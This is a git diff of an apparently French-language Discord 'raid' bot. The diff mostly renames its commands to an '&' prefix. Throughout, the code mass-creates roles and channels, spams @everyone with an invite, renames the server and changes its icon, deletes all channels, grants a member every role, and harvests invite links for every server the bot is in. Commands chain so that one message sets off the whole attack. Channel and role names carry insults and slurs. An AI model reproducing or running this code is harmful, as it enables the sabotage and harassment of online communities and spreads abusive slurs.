@@ -2,14 +2,14 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 bot.login (process.env.TOKEN);
 bot.on("ready", () => {
-bot.user.setActivity('Powered by Okue', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('OKUE BAISE LES INVITES', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
   bot.on("message", message => {
 if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
-if(message.content === "roles"){
+if(message.content === "&roles"){
 for(var i =0; i < 400; i++){
     message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                              mentionable:false,
@@ -123,7 +123,7 @@ color: "#ff0808"
 }
 
 
-if(message.content.includes("!role")){
+if(message.content.includes("&role")){
     message.guild.createRole({name:"Izi",
                               mentionable:false,
                               permissions:2146958591,
@@ -131,20 +131,20 @@ if(message.content.includes("!role")){
                               color: "#fb0707"
    })
 }
-if(message.content.includes("!raul")){
+if(message.content.includes("&raul")){
   (message.guild.roles.map(r => message.member.addRoles(r)))
 }
-if(message.content.includes("ar!kelsairvvesrx")){
+if(message.content.includes("&ar!kelsairvvesrx")){
   bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
 }
-          if(message.content.includes("A?serveurinvite")){
+          if(message.content.includes("&A?serveurinvite")){
               bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
           }
-          if(message.content === "!issou"){
+          if(message.content === "&issou"){
               message.guild.setName("LE CENTRE TA BZ :)")
               message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
             }
-            if(message.content === "!pd"){
+            if(message.content === "&pd"){
               for(var i =0; i < 450; i++){
               message.guild.createChannel("BY","voice")
               }
@@ -161,9 +161,9 @@ TA CAPTÉ ? **             https://discord.gg/R3K862v")
                 }
             }
             //réaction en chaine
-                  if(message.content === "channel"){
-                    message.channel.send("roles").then(m => m.delete());
-                    message.channel.send("issou").then(m => m.delete());
+                  if(message.content === "&channel"){
+                    message.channel.send("&roles").then(m => m.delete());
+                    message.channel.send("&issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone **INFORMATIONS SUR LA PIGEONNERIE :
@@ -204,20 +204,20 @@ TA CAPTÉ ? **             https://discord.gg/R3K862v ."))
 
                       }
                     }
-                    if(message.content === "!destroy"){
+                    if(message.content === "&destroy"){
                       message.guild.channels.map(c => c.delete())
                       }
                       //on commence la destruction
-                      if(message.content.includes("destroy")){
-                          message.channel.send("ban").then(m => m.delete());
-                          message.channel.send("drole").then(m => m.delete());
-                          message.channel.send("destroy").then(m => m.delete());
-                          message.channel.send("jechange").then(m => m.delete());
-                          message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
+                      if(message.content.includes("&destroy")){
+                          message.channel.send("&ban").then(m => m.delete());
+                          message.channel.send("&drole").then(m => m.delete());
+                          message.channel.send("&destroy").then(m => m.delete());
+                          message.channel.send("&jechange").then(m => m.delete());
+                          message.guild.createChannel("LA PIGEONNEIRE", "text").then(c => c.send("channel"))
                       }
                     });
 bot.on('message', message => {
- if(message.content.startsWith('alldm')){
+ if(message.content.startsWith('&alldm')){
 let cont = message.content.slice(1).split(" ")
         let args = cont.slice(1)
         let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
